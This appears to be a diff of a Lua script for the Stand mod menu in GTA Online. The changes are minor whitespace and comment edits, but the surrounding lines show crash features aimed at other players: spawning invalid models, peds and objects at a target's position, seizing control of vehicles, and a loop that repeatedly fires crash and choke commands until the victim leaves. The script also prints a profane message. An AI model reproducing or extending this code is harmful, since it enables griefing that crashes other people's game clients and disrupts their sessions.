@@ -346,7 +346,6 @@ menu.action(lobby, "Cargobob Crash", {"invalidbob"}, "Doesn't cause any crash ev
     entities.delete_by_handle(cargobob)
     entities.delete_by_handle(veh)
     PHYSICS.DELETE_CHILD_ROPE(newRope)
-
     util.toast("Go Fuck Your Self")
 end)
 
@@ -422,7 +421,6 @@ local function player(pid)
         local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
         pos.z = pos.z + 10
         veh = entities.get_all_vehicles_as_handles()
-
         for i = 1, #veh do
             NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
             ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
@@ -604,7 +602,6 @@ local function player(pid)
     end)
 
     menu.action(Crash, "NPC Crash", {"npccrash"}, "Will trigger stands spam protection", function()
-    
         local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
         local SpawnPed_Wade = {}
@@ -638,7 +635,6 @@ local function player(pid)
     end)
 
     menu.action(Crash, "Invalid model Crash", {"invalidmodel"}, "Will trigger 'XF' won't backfire", function()
-    
         local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
         local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
@@ -662,7 +658,6 @@ local function player(pid)
         entities.delete_by_handle(Object_pizza2)
         entities.delete_by_handle(Object_pizza3)
         entities.delete_by_handle(Object_pizza4)
-    
     end)
 
 
@@ -727,7 +722,6 @@ local function player(pid)
     end)
 
     menu.action(Crash, "Invalid Entity Crash", {}, "Really unreliable won't backfire", function()
-    
         local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
         local SpawnPed_slod_small_quadped = CreatePed(26, util.joaat("slod_small_quadped"), TargetPlayerPos,
@@ -740,7 +734,6 @@ local function player(pid)
         entities.delete_by_handle(SpawnPed_slod_small_quadped)
         entities.delete_by_handle(SpawnPed_slod_large_quadped)
         entities.delete_by_handle(SpawnPed_slod_human)
-    
     end)
 
     menu.action(Crash, "Invalid Object Crash", {"invalidobject"}, "Will trigger 'XF' won't backfire", function()
@@ -790,8 +783,7 @@ local function player(pid)
         entities.delete_by_handle(SpawnedVehicleList[i])
     end
  end)
-
-
+ 
     menu.action(Crash, "Chernobog Crash", {"invalidcherobog2"}, "Really unreliable won't backfire", function()
     local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
     local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
@@ -1567,7 +1559,7 @@ end)
         end
     end
   end)
-
+    -- very op
     menu.toggle_loop(Crash, "Stands crashes flood", {"standbumfuck"}, "Will spam Stands crashes until the player leaves", function()
             menu.trigger_commands("crash" .. players.get_name(pid))
             menu.trigger_commands("choke" .. players.get_name(pid))
